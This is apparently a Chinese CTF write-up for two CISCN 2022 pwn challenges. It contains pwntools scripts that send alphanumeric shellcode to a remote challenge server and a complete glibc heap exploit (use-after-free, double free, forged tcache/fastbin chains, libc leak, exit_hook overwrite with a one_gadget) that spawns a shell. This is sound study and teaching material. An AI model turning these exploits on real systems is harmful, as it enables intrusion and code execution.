---
title: 【CISCN2022】初赛PWN部分writeup
index_img: https://img-blog.csdnimg.cn/509bcd48db954ee2a913e5d325ac2c72.png
excerpt: ciscn2022初赛pwn方向login-normal和newest-note题解
---
# login-normal

题如其名，一道简单的签到题目，比赛被打烂了。主要在于代码分析，还有可打印shellcode的利用。这里我用的是github上一个大佬的项目AE64，可以用来生成可打印的shellcode，相当好用，强推,链接放在这里。

>  [veritas501/ae64: basic amd64 alphanumeric shellcode encoder (github.com)](https://github.com/veritas501/ae64)

```Python
from pwn import *
from ae64 import AE64

context.arch = 'amd64'
# io = process('./login')
io = remote('59.110.105.63', 29289)
payload = b'msg:ro0t\r\nopt:1\r\n'

io.sendline(payload)

sc = AE64()

shellocde = sc.encode(asm(shellcraft.sh()),'rdx')
payload = b'msg:'+shellocde+b'\r\nopt:2\r\n'


io.sendline(payload)
io.interactive()
```

# newest_note

 一道堆题目，比赛结束一个多小时才勉强做出来，非常可惜。主要还是不了解新libc的一些进制了解，临时学了下面这篇文章，才有个初步了解。建议先看完这篇文章，再来看我的wp。

>  [Heap Exploit v2.31 | 最新堆利用技巧，速速查收 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/136983333)
>  [浅谈glibc新版本保护机制及绕过方法 – 绿盟科技技术博客 (nsfocus.net)](http://blog.nsfocus.net/glibc-234/)

## 伪代码分析

简单看了伪代码后主要有如下几个重点

- free之后没有置空，存在UAF漏洞，可以通过show泄露freechunk的内容

![img](https://img-blog.csdnimg.cn/509bcd48db954ee2a913e5d325ac2c72.png)

- 没有chunk编辑函数，只能在malloc的时候编辑chunk内容，即无法修改tcache的flag内容。

- 有两个全局变量限制了malloc和free的次数，free仅能11次，malloc次数很多不用太担心。

- 每个chunk的size被限制在0x40。

![img](https://img-blog.csdnimg.cn/641a2a24c6634e648470ba9c17bacca3.png)

##  思路整理

我们来看看可以拿到的信息有哪些。首先，由于新libc的机制，我们可以利用uaf漏洞轻松获取heapbase，这里的key是新libc环境下用来xor操作的值。

```Python
add(0,'aaaa')
free(0)
show(0)
io.recvuntil('Content: ')
key=u64(io.recvuntil('\x0a')[:-1].ljust(8,b'\x00')) #key
heap_base = key<<12
success('key-->'+hex(key))
success('heap-->'+hex(heap_base))
```

 

![img](https://img-blog.csdnimg.cn/1e140e2c358548f7b56cec373b77f0d8.png)

其次，考虑如何泄露libc，由于存在UAF，我们一般可以通过unsortbin来进行泄露。但是问题在于，每个chunk的size都不够大，即便填满tache也只会进入fastbin，而不是unsortbin。在这里，我想到了两个思路

- 其一，在程序开头我们输入了一个size，并malloc了一个8*size的chunk用来起到note记录的作用。即这个chunk的size是可控的，**更重要的是这个chunk没有限制大小**如果可以free这个chunk进入unsortbin，便可以实现libc的泄露。但是在这种思路下，考虑填满tcache需要7次free，doublefree控制指针指向notechunk需要2-3次free，泄露libc需要一次free，然后再次doublefree劫持hook。free的次数显然超过11次，暂时无法实现，如果有大佬有方法通过控制开头的notechunk来解出这道题，希望能指点下我😭

- 其二，我们可以尝试伪造一个tcache链，使得其实际size小于0x40，利用溢出构造伪造巨大chunk头并free进入unsortbin，得到libc。同时在这种情况下，我们也可以用溢出轻易完成对freechunk内容的更改，以此劫持hook

下面我们采用第二种思路

### 一、得到heapbase

开始先申请几个chunk，多申请的那几个是用来扩充可控堆区域的大小，为伪造的大chunk提供空间，不然覆盖进topchunk程序会崩掉。这个步骤比较简单，前面也谈到了不过多赘述

 

```Python
io.recvuntil('How many pages your notebook will be? :')
io.sendline('16')

for i in range(16):
    add(i,'aaaaaaaa')

add(15,'cccccccc')
add(15,'cccccccc')
add(15,'cccccccc')

free(0)
show(0)
io.recvuntil('Content: ')
key=u64(io.recvuntil('\x0a')[:-1].ljust(8,b'\x00')) #key
heap_base = key<<12
success('key-->'+hex(key))
success('heap-->'+hex(heap_base))
```

### 二、伪造fastbin链

这里我们先填满tcache,然后free 7号chunk进入fastbin，结构入下图所示。由于新的libc机制，这里的fd指针都进行了异或操作，所以看起来并不是很直观。

 

```Python
for i in range(1,7):
    free(i)
## double free
free(7)
add(10,'aaaaaaaa')
free(7)
# pause()
```

![img](https://img-blog.csdnimg.cn/e5ae010babec4989a45fa29018da4cb4.png)

然后申请chunk，此时从tcache中取出最后一个chunk。由于此时tcache中仅剩6个chunk，我们再对7号chunk进行free时，它便会放入tcache中。通过这样的doublefree我们构造了一个即在Tcache又在fastbin的chunk，如下所示。

![img](https://img-blog.csdnimg.cn/839aa64c464c4ab1a42b524daf40f730.png)

 接下来我们便可以开始构造fake fastbin，需要注意的是fastbin中的fd指针同样需要异或处理，我们可以得到如下结构,此时tcache链长度为0，fastbin的长度为7.

 

```Python
add(10,p64(key^(heap_base+0x480)))
add(0,b'a'*0x20+p64(key^(heap_base+0x440)))
add(1,b'a'*0x20+p64(key^(heap_base+0x400)))
add(2,b'a'*0x20+p64(key^(heap_base+0x3a0)))
add(3,p64(key^(heap_base+0x380)))
add(4,b'a'*0x20+p64(key^(heap_base+0x340)))
add(5,b'a'*0x20+p64(key)) ##7
```

 

![img](https://img-blog.csdnimg.cn/5e6f8e3dac8945b28ddf8b4794c3395f.png)

###  三、伪造tcache链并泄露libc

 此时我们调用add()，就会触发fastbin和tcache的stash机制，此时其余6个chunk便会扔到tcache中，其结构如下所示

>  当从 fastbin 里取 chunk 时，其余的 chunk 会被依次放入对应的 tcache 中，终止条件时 fastbin 链为空或者 tcache 装满。

![img](https://img-blog.csdnimg.cn/687aa9ca42f04f08895b1958d2ae0c29.png)

 再次add，tcache和fastbin的取出顺序是相反的，即tcache最上方的chunk将被取出，同时编辑内容更改**0x56309de85360**的头部size大小为0x441。之后我们只需要free掉360处的chunk便可泄露libc

>  fastbin最大为0x410,这里用0x441刚好可以对齐chunk

![img](https://img-blog.csdnimg.cn/60c6e7ed5e2d4633b5226a7183ab38d7.png)

```Python
## change head of 4 
add(7,b'a'*0x18+p64(0x441))

free(4) 
show(4)
io.recvuntil('Content: ')
libc_base = u64(io.recvuntil('\x0a')[:-1].ljust(8,b'\x00')) - 0x218cc0
success('libc_base-->'+hex(libc_base))

exit_hook = libc_base + 0x21a6c8
one_gadget = libc_base + 0xeeccc
success('exit_hook-->'+hex(exit_hook))
```

>  这里没有选择freehook或者mallochook是因为没有合适的onegadget，选择劫持exithook

### 四、劫持exithook

由于我们在tcache链里折叠了两个chunk这样便可以轻松的更改freechunk的内容，劫持exithook为ongadget然后结束程序便可，最终结构如下

```Python
add(11,b'a'*0x18+p64(0x41)+p64(key^(exit_hook-0x8)))
add(12,b'aaaa')
add(13,b'a'*0x8+p64(one_gadget))
```

![img](https://img-blog.csdnimg.cn/6d12cf8cb53c453683ef5ee3ddc6f2d2.png)

##  EXP

```Python
from pwn import *

io = process('./newest_note')
# context.log_level = 'debug'

libc = ELF('./libc.so.6')

def add(idx,text):
    io.recvuntil('4. Exit')
    io.sendline('1')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    io.recvuntil('Content: ')
    io.send(text)
    
def free(idx):
    io.recvuntil('4. Exit')
    io.sendline('2')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    
def show(idx):
    io.recvuntil('4. Exit')
    io.sendline('3')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    
io.recvuntil('How many pages your notebook will be? :')
io.sendline('16')

for i in range(16):
    add(i,'aaaaaaaa')

add(15,'cccccccc')
add(15,'cccccccc')
add(15,'cccccccc')

free(0)
show(0)
io.recvuntil('Content: ')
key=u64(io.recvuntil('\x0a')[:-1].ljust(8,b'\x00')) #key
heap_base = key<<12
success('key-->'+hex(key))
success('heap-->'+hex(heap_base))
# pause()

for i in range(1,7):
    free(i)
## double free
free(7)
pause()
add(10,'aaaaaaaa')
free(7)
# pause()

## fake tcache
add(10,p64(key^(heap_base+0x480)))
add(0,b'a'*0x20+p64(key^(heap_base+0x440)))
add(1,b'a'*0x20+p64(key^(heap_base+0x400)))
add(2,b'a'*0x20+p64(key^(heap_base+0x3a0)))
add(3,p64(key^(heap_base+0x380)))
add(4,b'a'*0x20+p64(key^(heap_base+0x340)))
add(5,b'a'*0x20+p64(key)) ##7
add(7,'aaaaaaaa')

## change head of 4 
add(7,b'a'*0x18+p64(0x441))

free(4) 
show(4)
io.recvuntil('Content: ')
libc_base = u64(io.recvuntil('\x0a')[:-1].ljust(8,b'\x00')) - 0x218cc0
success('libc_base-->'+hex(libc_base))

exit_hook = libc_base + 0x21a6c8
one_gadget = libc_base + 0xeeccc
success('exit_hook-->'+hex(exit_hook))

add(11,b'a'*0x18+p64(0x41)+p64(key^(exit_hook-0x8)))
add(12,b'aaaa')
add(13,b'a'*0x8+p64(one_gadget))

io.recvuntil('4. Exit')
io.sendline('4')


io.interactive()
'''
0xeeccc execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xeeccf execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xeecd2 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL'''
```